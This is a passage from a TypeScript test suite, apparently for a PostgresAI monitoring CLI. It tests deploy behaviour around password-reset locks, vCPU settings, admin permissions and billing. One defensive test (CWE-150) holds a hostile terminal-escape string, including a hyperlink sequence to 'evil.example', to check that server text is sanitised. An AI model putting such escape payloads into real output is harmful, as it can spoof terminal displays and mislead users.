      "A new password for postgres_ai_mon may cut off the monitoring of orders (copy) (id i-8), orders (copy) (id i-9), Monitoring 16bb1d (the platform could not read its URL, so its server is not known): set PGAI_MON_PASSWORD to its password instead, or pgai mon instances delete i-8 --yes and pgai mon instances delete i-9 --yes and pgai mon instances delete 'Monitoring 16bb1d' --yes first");
  });

  test("--reset-password on a database already monitored under a name another box has: deleted by id", async () => {
    const { deps } = fake();
    deps.list = async () => [row("active", { cluster: `${SERVER}:5432`, database: "postgres" }), row("active", { id: "i-2" })];
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).next).toBe(
      `${CH_NAME} is already monitored, and its monitoring uses the current password. Delete it, then run this deploy again with --reset-password: pgai mon instances delete i-1 --yes`);
  });

  test("--reset-password: a box connected under the lock whose name another box has is deleted by id", async () => {
    const { deps } = fake();
    let listed = 0;
    deps.list = async () => (listed++ === 0 ? [] : [row("launch_requested", { cluster: `${SERVER}:5432`, database: "postgres" }), row("active", { id: "i-2" })]);
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).next).toBe(
      `${CH_NAME} is already monitored, and its monitoring uses the current password. Delete it, then run this deploy again with --reset-password: pgai mon instances delete i-1 --yes`);
  });

  test("--reset-password against a platform without the lock: nothing reset, PGAI_MON_PASSWORD instead", async () => {
    const { deps, calls } = fake({ resetLock: async () => { throw new HttpStatusError("Failed to cloud monitoring reset lock (HTTP 404)", 404); } });
    expect(await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, ...FREE,
      next: "This platform cannot lock the server for --reset-password yet: set PGAI_MON_PASSWORD to postgres_ai_mon's password instead",
    });
    expect(calls).toEqual(["list", "check clickhouse"]);
  });

  // Only a held lock (409) or no lock at all (404) is an answer: on anything
  // else nothing is known to hold the server, and nothing is reset.
  for (const [what, err] of [["a 500", new HttpStatusError("Failed to cloud monitoring reset lock (HTTP 500)", 500)], ["no answer", new Error("fetch failed")]] as const) {
    test(`--reset-password when the lock request gets ${what}: the error, nothing prepared or requested`, async () => {
      const { deps, calls } = fake({ resetLock: async (server) => { calls.push(`resetLock ${server}`); throw err; } });
      await expect(connect(CH, { resetPassword: true, waitMs: 0 }, deps)).rejects.toThrow(err.message);
      expect(calls).toEqual(["list", "check clickhouse", `resetLock ${SERVER}:5432`]);
    });
  }

  test("--reset-password when the platform answers the lock without a lock id: the error, nothing prepared or requested", async () => {
    const { deps, calls } = fake({ resetLock: async (server) => { calls.push(`resetLock ${server}`); return {} as never; } });
    await expect(connect(CH, { resetPassword: true, waitMs: 0 }, deps)).rejects.toThrow("cloud_monitoring_reset_lock returned no lock_id: nothing was changed");
    expect(calls).toEqual(["list", "check clickhouse", `resetLock ${SERVER}:5432`]);
  });

  test("--reset-password: the same database connected by the run that held the lock is seen under it", async () => {
    const { deps, calls } = fake({ rows: [undefined, row("launch_requested", { name: "abc123 (ClickHouse)", cluster: "abc123.us-east-1.aws.pg.clickhouse.cloud:5432", database: "postgres" })] });
    expect(await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "clickhouse", name: CH_NAME, id: "i-1", ...FREE,
      next: "abc123 (ClickHouse) is already monitored, and its monitoring uses the current password. Delete it, then run this deploy again with --reset-password: pgai mon instances delete 'abc123 (ClickHouse)' --yes",
    });
    expect(calls).toEqual(["list", "check clickhouse", `resetLock ${SERVER}:5432`, "list", "resetUnlock l-1"]);
  });

  test("--reset-password: the server is one lock and one name whatever its case or trailing dot, with a port too", async () => {
    const other = row("active", { id: "i-7", name: `${SERVER.toUpperCase()}./orders` });
    const { deps, calls } = fake({ rows: [other] });
    expect((await connect(CH.replace(SERVER, `${SERVER.replace("abc123", "ABC123")}.`), { resetPassword: true, waitMs: 0 }, deps)).status).toBe("action_required");
    expect(calls).toEqual(["list"]);
    const second = fake();
    await connect(CH.replace(SERVER, SERVER.toUpperCase()), { resetPassword: true, waitMs: 0 }, second.deps);
    expect(second.calls[2]).toBe(`resetLock ${SERVER}:5432`);
    const port = fake();
    await connect(CH.replace(`${SERVER}:5432`, `${SERVER.toUpperCase()}.:6432`), { resetPassword: true, waitMs: 0 }, port.deps);
    expect(port.calls[2]).toBe(`resetLock ${SERVER}:6432`);
  });

  test("--reset-password: a refused launch drops the generated role before the lock is released", async () => {
    const { deps, calls } = fake({
      prepare: async (_u, _p, o) => { calls.push(o?.check ? "check" : "prepare"); return o?.check ? { checked: true } : { monitoringUrl: MON, generated: true }; },
      create: async () => { calls.push("create"); return { id: "i-1", name: CH_NAME, status: "failed", error: "No." }; },
    });
    await connect(CH, { resetPassword: true, waitMs: 0 }, deps);
    expect(calls.slice(-2)).toEqual(["unprepare", "resetUnlock l-1"]);
  });

  test("--reset-password releases the lock when the platform refuses the box (4xx: nothing was created)", async () => {
    const { deps, calls } = fake({ create: async () => { throw new HttpStatusError("Failed to cloud monitoring connect (HTTP 400)", 400); } });
    await expect(connect(CH, { resetPassword: true, waitMs: 0 }, deps)).rejects.toThrow("HTTP 400");
    expect(calls.at(-1)).toBe("resetUnlock l-1");
  });

  // A box request without an answer may still create the box with this URL:
  // a run that took the lock now would not see it, and would reset its password.
  for (const err of [new HttpStatusError("Failed to cloud monitoring connect (HTTP 502)", 502), new Error("timed out")]) {
    test(`--reset-password keeps the lock when the box request fails with ${err.message}: the lease frees the server`, async () => {
      const { deps, calls } = fake({ ...clock(), create: async () => { calls.push("create"); throw err; } });
      if (err instanceof HttpStatusError) expect((await connect(CH, { resetPassword: true, waitMs: 0 }, deps)).next).toBe(NOT_CONFIRMED);
      else await expect(connect(CH, { resetPassword: true, waitMs: 0 }, deps)).rejects.toThrow(err.message);
      expect(calls).not.toContain("resetUnlock l-1");
    });
  }

  test("--reset-password: a lock that cannot be released changes nothing of the result, and hides no error", async () => {
    const unlockFails = { resetUnlock: async () => { throw new Error("unlock failed"); } };
    expect((await connect(CH, { resetPassword: true, waitMs: 0 }, fake({ rows: [undefined, undefined, row("launch_requested")], ...unlockFails }).deps)).status).toBe("in_progress");
    const refused = fake({ ...unlockFails, create: async () => { throw new HttpStatusError("Failed to cloud monitoring connect (HTTP 403)", 403); } });
    await expect(connect(CH, { resetPassword: true, waitMs: 0 }, refused.deps)).rejects.toThrow("HTTP 403");
  });

  test("--name and --location go to the platform with the box request (postgresai#412)", async () => {
    const { deps, calls } = fake();
    await connect(CH, { waitMs: 0, name: "my-mon", location: "nbg1" }, deps);
    const create = calls.find((c) => c.startsWith("create "))!;
    expect(JSON.parse(create.slice("create ".length))).toMatchObject({ project_name: "my-mon", server_location: "nbg1" });
    const plain = fake();
    await connect(CH, { waitMs: 0 }, plain.deps);
    const body = JSON.parse(plain.calls.find((c) => c.startsWith("create "))!.slice("create ".length));
    expect(body).not.toHaveProperty("project_name");
    expect(body).not.toHaveProperty("server_location");
  });

  describe("--vcpus: AAS needs the database server's vCPUs (the user's e2e, postgresai#412)", () => {
    const SM = "postgresql://u:p@10.0.0.5:5432/app";
    const body = (calls: string[]) => JSON.parse(calls.find((c) => c.startsWith("create "))!.slice("create ".length));

    test("--vcpus goes to the platform with the box request", async () => {
      const { deps, calls } = fake();
      await connect(SM, { waitMs: 0, vcpus: 4 }, deps);
      expect(body(calls)).toMatchObject({ vcpus: 4 });
    });

    test("no --vcpus at a terminal: asked once, and told there is no AAS data without it", async () => {
      const asked: string[] = [];
      const f = fake({ askVcpus: async (q) => { asked.push(q); return 8; } });
      await connect(SM, { waitMs: 0 }, f.deps);
      expect(asked).toHaveLength(1);
      expect(asked[0]).toMatch(/vCPUs/);
      expect(asked[0]).toMatch(/no AAS/);
      expect(body(f.calls)).toMatchObject({ vcpus: 8 });
      // Skipped (Enter): the box comes without, and the run says AAS is off.
      const notes: string[] = [];
      const blank = fake({ askVcpus: async () => undefined, progress: (e) => { notes.push(e.message); } });
      await connect(SM, { waitMs: 0 }, blank.deps);
      expect(body(blank.calls)).not.toHaveProperty("vcpus");
      expect(notes.filter((m) => /^Note: .*no AAS/.test(m))).toHaveLength(1);
    });

    test("nobody to ask (--yes, an agent): not asked, and a note says AAS is off", async () => {
      for (const opts of [{ yes: true }, { agent: true }]) {
        const asked: string[] = [];
        const notes: string[] = [];
        const f = fake({ askVcpus: async (q) => { asked.push(q); return 2; }, progress: (e) => { notes.push(e.message); } });
        await connect(SM, { waitMs: 0, ...opts }, f.deps);
        expect(asked).toEqual([]);
        expect(body(f.calls)).not.toHaveProperty("vcpus");
        expect(notes.filter((m) => /^Note: .*no AAS/.test(m))).toHaveLength(1);
      }
    });

    describe("a database already monitored (#904)", () => {
      const live = (vcpus?: number | null) => row("active", { name: "10.0.0.5/app", provider: "self-managed", vcpus });
      const withSet = (over: Parameters<typeof fake>[0] = {}) => {
        const sets: [string, number][] = [];
        const f = fake({ setVcpus: async (id: string, n: number) => { sets.push([id, n]); return { changed: true }; }, ...over });
        return { ...f, sets };
      };

      test("--vcpus sets them when it has none, and says so", async () => {
        const f = withSet({ rows: [live(null)] });
        const r = await connect(SM, { waitMs: 0, vcpus: 4 }, f.deps);
        expect(f.sets).toEqual([["i-1", 4]]);
        expect(r.next).toMatch(/vCPUs set to 4/);
      });

      test("--vcpus with a different value already set: unchanged, a note points to instances set", async () => {
        const f = withSet({ rows: [live(2)] });
        const r = await connect(SM, { waitMs: 0, vcpus: 4 }, f.deps);
        expect(f.sets).toEqual([]);
        expect(r.next).toContain("already has 2 vCPUs");
        expect(r.next).toContain("pgai mon instances set i-1 --vcpus 4");
      });

      test("no --vcpus and none set: a terminal asks (no AAS without them); the answer is set", async () => {
        const asked: string[] = [];
        const f = withSet({ rows: [live(null)], askVcpus: async (q) => { asked.push(q); return 3; } });
        await connect(SM, { waitMs: 0 }, f.deps);
        expect(asked).toHaveLength(1);
        expect(asked[0]).toMatch(/no AAS/);
        expect(f.sets).toEqual([["i-1", 3]]);
      });

      test("no --vcpus, none set, nobody to ask: not asked, nothing set, a note says there is no AAS and how to fix it", async () => {
        for (const opts of [{ yes: true }, { agent: true }]) {
          const f = withSet({ rows: [live(null)], askVcpus: async () => 3 });
          const r = await connect(SM, { waitMs: 0, ...opts }, f.deps);
          expect(f.sets).toEqual([]);
          expect(r.next).toMatch(/no AAS/);
          expect(r.next).toContain("pgai mon instances set i-1 --vcpus <n>");
        }
      });

      test("vCPUs already set and no --vcpus: nothing asked, nothing set, no note", async () => {
        const asked: string[] = [];
        const f = withSet({ rows: [live(2)], askVcpus: async (q) => { asked.push(q); return 3; } });
        const r = await connect(SM, { waitMs: 0 }, f.deps);
        expect(asked).toEqual([]);
        expect(f.sets).toEqual([]);
        expect(r.next ?? "").not.toMatch(/vCPU|AAS/);
      });

      test("not an org admin: nothing set, a note says only an admin can", async () => {
        const f = withSet({ rows: [live(null)], setVcpus: async () => { throw new HttpStatusError("cloud monitoring set vcpus: HTTP 403 - Permission Denied", 403); } });
        const r = await connect(SM, { waitMs: 0, vcpus: 4 }, f.deps);
        expect(r.status).toBe("ready");
        expect(r.next).toMatch(/only an organization admin/i);
      });
    });

    test("an HTTP status is read by shape: the bundle holds two copies of HttpStatusError (instanceof misses one)", () => {
      class OtherCopy extends Error { constructor(message: string, readonly status: number) { super(message); } }
      expect(httpStatus(new OtherCopy("cloud monitoring set vcpus: HTTP 403 - Permission Denied", 403))).toBe(403);
      expect(httpStatus(new HttpStatusError("x: HTTP 404", 404))).toBe(404);
      expect(httpStatus(new Error("no status"))).toBeUndefined();
      expect(httpStatus("403")).toBeUndefined();
    });

    test("the no-vCPUs note of a new deploy names the way to add them later", () => {
      expect(NO_VCPUS_NOTE).toContain("pgai mon instances set");
    });

    test("not asked for a database already monitored with vCPUs, nor for ClickHouse (its vCPUs come from ClickHouse Cloud)", async () => {
      const asked: string[] = [];
      const ask = { askVcpus: async (q: string) => { asked.push(q); return 2; } };
      await connect(SM, { waitMs: 0 }, fake({ rows: [row("active", { name: "10.0.0.5/app", provider: "self-managed", vcpus: 2 })], ...ask }).deps);
      await connect(CH, { waitMs: 0 }, fake(ask).deps);
      expect(asked).toEqual([]);
    });
  });

  test("a database already monitored keeps its name: --name is ignored, and says so", async () => {
    const { deps, calls } = fake({ rows: [row("active")] });
    const result = await connect(CH, { waitMs: 0, name: "other" }, deps);
    expect(result.status).toBe("ready");
    expect(result.next).toEndWith(`; --name ignored: this database is already monitored as ${CH_NAME}`);
    expect(calls.some((c) => c.startsWith("create "))).toBe(false);
  });

  test("a token whose user is not an org admin: action required (exit 3), nothing prepared (postgresai#412)", async () => {
    const forbidden = () => { throw new HttpStatusError("cloud monitoring quote: HTTP 403 - Forbidden - access denied", 403); };
    const { deps, calls } = fake({ quote: async () => forbidden() });
    const result = await connect(CH, { waitMs: 0 }, deps);
    expect(result).toEqual({ status: "action_required", provider: "clickhouse", name: CH_NAME,
      next: "Only an organization admin can deploy: ask an admin to run it, or use an admin's API key." });
    expect(calls.filter((c) => c.startsWith("prepare ") || c.startsWith("create "))).toEqual([]);
  });

  test("a database that cannot be reached: the error names the server it tried (M6)", async () => {
    const { deps } = fake({ prepare: async () => { throw new Error("timeout expired"); } });
    await expect(connect("postgresql://u:p@db.example.com:6543/app", { waitMs: 0 }, deps))
      .rejects.toThrow("Could not connect to db.example.com:6543: timeout expired");
  });

  test("a platform refusal reads in the platform's words, without the HTTP status line (as dblab's)", () => {
    expect(errorText(new HttpStatusError("cloud monitoring disconnect: HTTP 400 - Bad Request\nThis database is not on a PostgresAI-managed monitoring box.\nHint: In your own cloud: delete it in the console.", 400)))
      .toBe("This database is not on a PostgresAI-managed monitoring box.\nHint: In your own cloud: delete it in the console.");
    // Nothing but the status line: kept, it is all there is.
    expect(errorText(new HttpStatusError("cloud monitoring list: HTTP 502", 502))).toBe("cloud monitoring list: HTTP 502");
  });

  test("a box removed because its first charge failed: action required on every path (watch too), with why", () => {
    const r = connectStatus(row("deleting_launched", { billing_error: "Your card was declined." }));
    expect(r.status).toBe("action_required");
    expect(r.next).toBe("The first charge failed (Your card was declined.): the box is being removed and nothing is billed. Update the payment method, then re-run pgai mon deploy.");
  });

  test("a first charge refused for the promo code says to change the code, not the payment method (platform-all#971)", () => {
    const refused = "Bad Request: Stripe POST /subscriptions returned 400: This promotion code is not specified for use with this customer.";
    const r = connectStatus(row("deleting_launched", { billing_error: refused }));
    expect(r.status).toBe("action_required");
    expect(r.next).toBe(`The first charge failed (${refused}): the box is being removed and nothing is billed. The promo code cannot be used by this organization: re-run pgai mon deploy without --coupon, or with a code this organization can use.`);
  });

  test("at a terminal the result is a few sentences, the links whole, not a dump of fields", () => {
    const ready = { status: "ready" as const, provider: "self-managed" as const, name: "db.example.com/app", id: "i-1",
      health_url: "https://console.example/acme/projects/app/health", dashboard_url: "https://abc.pgai.watch/login/generic_oauth?redirectTo=%2F",
      host_metrics: false, price: "$512.00/month per database cluster (scale plan)", next: "Open https://console.example/acme/projects/app/health" };
    expect(resultLines(ready)).toEqual([
      "Monitoring for db.example.com/app is ready.",
      "  Health Matrix: https://console.example/acme/projects/app/health",
      "  Grafana:       https://abc.pgai.watch/login/generic_oauth?redirectTo=%2F",
      "  Price:         $512.00/month per database cluster (scale plan)",
    ]);
    expect(resultLines({ status: "in_progress", provider: "self-managed", name: "db.example.com/app", id: "i-1", next: "pgai mon instances watch i-1" }))
      .toEqual(["Monitoring for db.example.com/app is still being set up. Follow it: pgai mon instances watch i-1"]);
    expect(resultLines({ status: "deleting", provider: "self-managed", name: "db.example.com/app", id: "i-1", next: "none" }))
      .toEqual(["Deleting the monitoring of db.example.com/app."]);
    expect(resultLines({ status: "action_required", provider: "self-managed", name: "x", next: "Add a payment method at u, then re-run." }))
      .toEqual(["Add a payment method at u, then re-run."]);
  });

  test("REV r2: a password that is not percent-encoded is refused, also on the MCP path (connect)", async () => {
    const { deps, calls } = fake();
    await expect(connect("postgresql://u:/Secret?Part@db.example.com/app", { waitMs: 0, agent: true }, deps)).rejects.toThrow("percent-encode");
    expect(calls).toEqual([]);
    // An '@' in the database name after a user is the database's.
    expect(databaseName("postgresql://u:p@h/my@db")).toBe("h/my@db");
  });

  test("REV r1: Ctrl-C before the box is requested cancels: the lock goes, a generated role is dropped, nothing created", async () => {
    let stop = false;
    const { deps, calls } = fake({
      prepare: async (_u, _p, o) => { if (!o?.check) stop = true; return o?.check ? { checked: true } : { monitoringUrl: MON, generated: true }; },
      aborted: () => stop,
    });
    await expect(connect(CH, { waitMs: 0, resetPassword: true }, deps)).rejects.toBeInstanceOf(CancelledError);
    expect(calls.some((c) => c.startsWith("create "))).toBe(false);
    expect(calls).toContain("unprepare");
    expect(calls).toContain("resetUnlock l-1");
  });

  test("REV r1: Ctrl-C while the box request is in flight: the box exists, so the run detaches (in progress, how to follow)", async () => {
    let stop = false;
    const { deps, calls } = fake({
      create: async () => { stop = true; return { id: "i-1", name: CH_NAME, status: "launch_requested" }; },
      aborted: () => stop,
    });
    const result = await connect(CH, { waitMs: 60_000 }, deps);
    expect(result).toMatchObject({ status: "in_progress", id: "i-1", next: "pgai mon instances watch i-1" });
    expect(calls).not.toContain("unprepare");
    expect(calls.filter((c) => c === "sleep")).toEqual([]);
  });

  test("REV r1: at a terminal the step view starts only after the price (a prompt may follow it); no price, no view", () => {
    const lines: string[] = [];
    let views = 0;
    const view = { start() {}, advance() {}, log(m: string) { lines.push(`view: ${m}`); }, setNote() {}, complete() {}, fail() {}, stop() {} };
    const make = () => { views++; return view; };
    const ev = (event: ProgressEvent["event"], message: string, more: Partial<ProgressEvent> = {}): ProgressEvent => ({ event, elapsed_s: 0, message, ...more });
    const p = stepProgress({ json: false, tty: true, makeView: make, writeLine: (s) => lines.push(s), writeEvent: () => {} });
    p.progress(ev("preparing", "Note: channel_binding upgraded"));
    p.progress(ev("billing", "Estimated cost: $512.00/month"));
    expect(views).toBe(0);
    expect(lines).toEqual(["Note: channel_binding upgraded", "Estimated cost: $512.00/month"]);
    p.progress(ev("preparing", "Preparing x"));
    expect(views).toBe(1);
    p.progress(ev("box", "Monitoring box: starting", { state: "launch_requested", id: "i-1" }));
    expect(lines).not.toContain("view: Monitoring box: starting");
    const selfHosted = stepProgress({ json: false, tty: true, makeView: () => { views++; return view; }, writeLine: () => {}, writeEvent: () => {} });
    selfHosted.progress(ev("preparing", "Preparing y"));
    expect(views).toBe(1);
  });

  // REV r4/r5 potential (CWE-150): platform text (details, hints, a box state) reaches the terminal as text, never as escapes.
  test("server text for a person: escape sequences and control characters are neutralised, line breaks kept", () => {
    const ESC = "Refused\x1b[2J\x1b[31m by\x1b]8;;https://evil.example\x07 the\tplatform\r\x00\x7f\x9b2J\nHint: re-run";
    const controls = /[\x00-\x09\x0b-\x1f\x7f-\x9f]/;
    for (const status of ["action_required", "failed", "ready", "in_progress"] as const) {
      const lines = resultLines({ status, provider: "supabase", name: "n", id: "i-1", next: ESC });
      expect(lines.join("\n")).not.toMatch(controls);
      expect(lines.join("\n")).toContain("Refused");
    }
    expect(resultLines({ status: "failed", provider: "supabase", name: "n", next: ESC })[0]).toMatch(/^Refused +by +the +platform *\nHint: re-run$/);
    const ev = (event: ProgressEvent["event"], message: string, more: Partial<ProgressEvent> = {}): ProgressEvent => ({ event, elapsed_s: 0, message, ...more });
    for (const tty of [false, true]) {
      const out: string[] = [];
      const view = { start() {}, advance() {}, log(m: string) { out.push(m); }, setNote(m: string) { out.push(m); }, complete() {}, fail() {}, stop() {} };
      const p = stepProgress({ json: false, tty, makeView: () => view, writeLine: (s) => out.push(s), writeEvent: () => {} });
      p.progress(ev("preparing", `Note: ${ESC}`));
      p.progress(ev("billing", `Estimated cost: ${ESC}`));
      p.progress(ev("provisioning", `Warning: ${ESC}`));
      p.progress(ev("box", `Monitoring box: ${ESC}`, { state: "\x1b[2Jstarting", id: "i-1" }));
      expect(out.length).toBeGreaterThan(2);
      for (const line of out) expect(line).not.toMatch(controls);
    }
  });

  test("REV r1: a note in the next action reaches a person at a terminal", () => {
    expect(resultLines({ status: "ready", provider: "self-managed", name: "n", id: "i-1", health_url: "https://h", dashboard_url: null,
      next: "Open https://h; --name ignored: this database is already monitored as n" }))
      .toContain("Note: --name ignored: this database is already monitored as n");
  });

  test("a note from the prepare step ends the next action", async () => {
    const { deps } = fake({ prepare: async () => ({ monitoringUrl: MON, note: "the password was not checked" }) });
    expect((await connect(CH, { waitMs: 0 }, deps)).next).toBe("pgai mon instances watch i-1; the password was not checked");
    expect((await connect(CH, { selfHosted: true, waitMs: 0 }, deps)).next).toBe("pgai mon health; the password was not checked");
  });
});

// The prepare step with a faked pg client: what the server answers to each
// login is scripted, and every statement run over the admin connection is recorded.
describe("mon deploy on the paid path: the price before the box", () => {
  const PAID = {
    plan: "scale", org_alias: "acme", billed: true, free_slots: { remaining: 0, total: 0 },
    subscription: false, quantity: 0, price: { amount: 51200, currency: "usd", interval: "month" },
    has_payment_method: true, requires_payment_method: false,
  };
  const quoted = (q: Record<string, unknown>, calls: string[]) => async (coupon?: string) => {
    calls.push(`quote${coupon ? ` ${coupon}` : ""}`);
    return { ...PAID, ...q } as never;
  };
  const SH = "postgresql://postgres:adminpw@db.example.com:5432/app";
  const SH_NAME = "db.example.com/app";
  const make = (q: Record<string, unknown> = {}, over: Parameters<typeof fake>[0] = {}) => {
    const f = fake({ rows: [undefined, row("active", { name: SH_NAME, provider: "self-managed", host_metrics: false })], ...over });
    f.deps.quote = quoted(q, f.calls);
    f.deps.billingUrl = (alias: string) => `https://console.example/${alias}/billing`;
    return f;
  };

  test("a billed box without --yes, where nobody can be asked: the price and how to accept, nothing prepared", async () => {
    const { deps, calls } = make();
    deps.confirm = async () => false;
    expect(await connect(SH, { waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      price: "$512.00/month per database cluster (scale plan)", requires_payment_method: false,
      next: "Re-run with --yes to accept $512.00/month per database cluster (scale plan)",
    });
    expect(calls).toEqual(["list", "check self-managed", "quote"]);
  });

  test("a billed box, confirmed at the prompt (which names the price): provisioned, the price in the result", async () => {
    const { deps, calls } = make();
    const asked: string[] = [];
    deps.confirm = async (q) => { asked.push(q); return true; };
    const result = await connect(SH, { waitMs: 60_000 }, deps);
    expect(asked).toEqual([`Provision ${SH_NAME}? (y/N): `]);
    expect(calls.slice(0, 4)).toEqual(["list", "check self-managed", "quote", "prepare self-managed"]);
    // The price was accepted: the platform creates a billed box only with accept_price.
    expect(calls[4]).toBe(`create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true, accept_price: true })}`);
    expect(result).toMatchObject({ status: "ready", price: "$512.00/month per database cluster (scale plan)", requires_payment_method: false });
  });

  test("--yes: no prompt; a box added to the subscription says which box it is", async () => {
    const { deps, calls } = make({ subscription: true, quantity: 1 });
    deps.confirm = async () => { throw new Error("asked"); };
    const result = await connect(SH, { waitMs: 60_000, yes: true }, deps);
    expect(calls.slice(0, 4)).toEqual(["list", "check self-managed", "quote", "prepare self-managed"]);
    expect(result.price).toBe("$512.00/month per database cluster (scale plan), cluster 2 on the subscription");
  });

  test("declined at the prompt: nothing prepared", async () => {
    const { deps, calls } = make();
    deps.confirm = async () => false;
    expect((await connect(SH, { waitMs: 0 }, deps)).status).toBe("action_required");
    expect(calls).toEqual(["list", "check self-managed", "quote"]);
  });

  test("no payment method: stop before the database is touched, with the billing page (exit 3)", async () => {
    const { deps, calls } = make({ has_payment_method: false, requires_payment_method: true });
    expect(await connect(SH, { waitMs: 0, yes: true }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      price: "$512.00/month per database cluster (scale plan)", requires_payment_method: true,
      next: "Add a payment method at https://console.example/acme/billing, then re-run.",
    });
    expect(calls).toEqual(["list", "check self-managed", "quote"]);
  });

  test("a free slot: no prompt, the result says free (N of M free slots)", async () => {
    const { deps, calls } = make({ billed: false, free_slots: { remaining: 1, total: 2 } });
    deps.confirm = async () => { throw new Error("asked"); };
    const result = await connect(SH, { waitMs: 60_000 }, deps);
    expect(calls.slice(0, 4)).toEqual(["list", "check self-managed", "quote", "prepare self-managed"]);
    expect(result).toMatchObject({ status: "ready", price: "free (1 of 2 free slots)", requires_payment_method: false });
  });

  test("--coupon: the discounted price is shown, and the code goes with the box", async () => {
    const promo = { code: "LAUNCH100", valid: true, discount_description: "100% off (first billing period)", percent_off: 100, duration: "once", promotion_code_id: "promo_1" };
    const { deps, calls } = make({ promo, amount_after_promo: 0 });
    const result = await connect(SH, { waitMs: 60_000, yes: true, coupon: "LAUNCH100" }, deps);
    expect(calls[2]).toBe("quote LAUNCH100");
    expect(calls[4]).toBe(`create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true, promo_code: "LAUNCH100", accept_price: true })}`);
    expect(result).toMatchObject({
      status: "ready",
      price: "$0.00 the first month with LAUNCH100 (100% off (first billing period)), then $512.00/month per database cluster (scale plan)",
      coupon: { code: "LAUNCH100", valid: true, description: "100% off (first billing period)" },
    });
  });

  test("an invalid or expired coupon: a clear error (exit 3), nothing prepared or provisioned", async () => {
    const { deps, calls } = make({ promo: { code: "OLD", valid: false, error: "Promo code is expired" } });
    expect(await connect(SH, { waitMs: 0, yes: true, coupon: "OLD" }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      price: "$512.00/month per database cluster (scale plan)", requires_payment_method: false,
      coupon: { code: "OLD", valid: false, error: "Promo code is expired" },
      next: "Promo code OLD: Promo code is expired. Nothing was changed: re-run with a valid code, or without --coupon",
    });
    expect(calls).toEqual(["list", "check self-managed", "quote OLD"]);
  });

  test("the platform refusing for payment (402, a card removed meanwhile): the billing page, not a failure", async () => {
    const { deps } = make({}, { create: async () => { throw new HttpStatusError("Payment Required", 402); } });
    expect(await connect(SH, { waitMs: 0, yes: true }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      price: "$512.00/month per database cluster (scale plan)", requires_payment_method: true,
      next: "Add a payment method at https://console.example/acme/billing, then re-run.",
    });
  });

  test("a 402 although the org has a card (it was declined): says so, with the billing page", async () => {
    const { deps } = make({}, { create: async () => { throw new HttpStatusError("Your card was declined.", 402); } });
    expect((await connect(SH, { waitMs: 0, yes: true }, deps)).next)
      .toBe("The payment method on file was declined: update it at https://console.example/acme/billing, then re-run.");
  });

  test("a free slot sends no accept_price; the platform billing it after all (412, the slot went meanwhile) is: re-run to see the price", async () => {
    const { deps, calls } = make({ billed: false, free_slots: { remaining: 1, total: 1 } }, { create: async (body) => { calls.push(`create ${JSON.stringify(body)}`); throw new HttpStatusError("Precondition Failed", 412); } });
    expect(await connect(SH, { waitMs: 0 }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      price: "free (1 of 1 free slots)", requires_payment_method: false,
      next: "The price changed since it was shown: re-run pgai mon deploy to see it",
    });
    expect(calls[4]).toBe(`create ${JSON.stringify({ db_url: MON, allow_ip_fallback: true })}`);
  });

  test("--coupon '' (an empty variable): refused, not dropped; nothing prepared", async () => {
    const { deps, calls } = make();
    expect(await connect(SH, { waitMs: 0, yes: true, coupon: " " }, deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME,
      next: "--coupon is empty: pass a promotion code, or leave --coupon out",
    });
    expect(calls).toEqual(["list"]);
  });

  // Billing starts when the box is active: a declined first charge then removes the box while deploy waits.
  test("the first charge declined at activation: why, where to fix it, and the generated role dropped", async () => {
    const f = make({}, { rows: [undefined, row("registered", { name: SH_NAME, provider: "self-managed", host_metrics: false }), row("deleting_launched", { name: SH_NAME, provider: "self-managed", host_metrics: false, billing_error: "Payment Required: Stripe payment required for POST /subscriptions: Your card was declined." })] });
    f.deps.prepare = async (_u, provider, o) => { f.calls.push(`${o?.check ? "check" : "prepare"} ${provider}`); return o?.check ? { checked: true } : { monitoringUrl: MON, generated: true }; };
    expect(await connect(SH, { waitMs: 60_000, yes: true }, f.deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME, id: "i-1",
      price: "$512.00/month per database cluster (scale plan)", requires_payment_method: false,
      next: "The first charge failed (Payment Required: Stripe payment required for POST /subscriptions: Your card was declined.): the box is being removed and nothing is billed. Update the payment method at https://console.example/acme/billing, then re-run",
    });
    expect(f.calls.filter((c) => c === "unprepare")).toEqual(["unprepare"]);
  });

  test("a retry polling an existing box reports its billing failure without dropping the role", async () => {
    const f = make({}, { rows: [row("registered", { name: SH_NAME }), row("deleting_launched", { name: SH_NAME, billing_error: "Your card was declined." })] });
    expect(await connect(SH, { waitMs: 60_000 }, f.deps)).toEqual({
      status: "action_required", provider: "self-managed", name: SH_NAME, id: "i-1",
      next: "The first charge failed (Your card was declined.): the box is being removed and nothing is billed. Update the payment method, then re-run",
    });
    expect(f.calls).toEqual(["list", "sleep", "list"]);
  });

  test("the box removed while deploy waits, with no reason given: failed, not waiting out the deadline", async () => {
    const f = make({}, { rows: [undefined, row("registered", { name: SH_NAME, provider: "self-managed", host_metrics: false }), undefined] });
    let t = 0;
    f.deps.now = () => (t += 15_000);
    const r = await connect(SH, { waitMs: 60 * 60_000, yes: true }, f.deps);
    expect(r.status).toBe("failed");
    expect(r.next).toBe("The monitoring box was removed before it became active: see pgai mon instances list, then re-run pgai mon deploy");
    expect(f.calls.filter((c) => c === "sleep").length).toBeLessThan(5);
  });

  // Pricing is per Postgres cluster observed: the quote is asked for this URL's cluster (host:port).
  test("the quote is asked for the URL's cluster; another database in a billed cluster is included, never prompted", async () => {
    const seen: (string | undefined)[] = [];
    const { deps, calls } = make({ billed: false, same_cluster: "db.example.com/other", subscription: true, quantity: 1 });
    const inner = deps.quote;
    deps.quote = async (coupon, cluster) => { seen.push(cluster); return inner(coupon, cluster); };
    deps.confirm = async () => { throw new Error("asked"); };
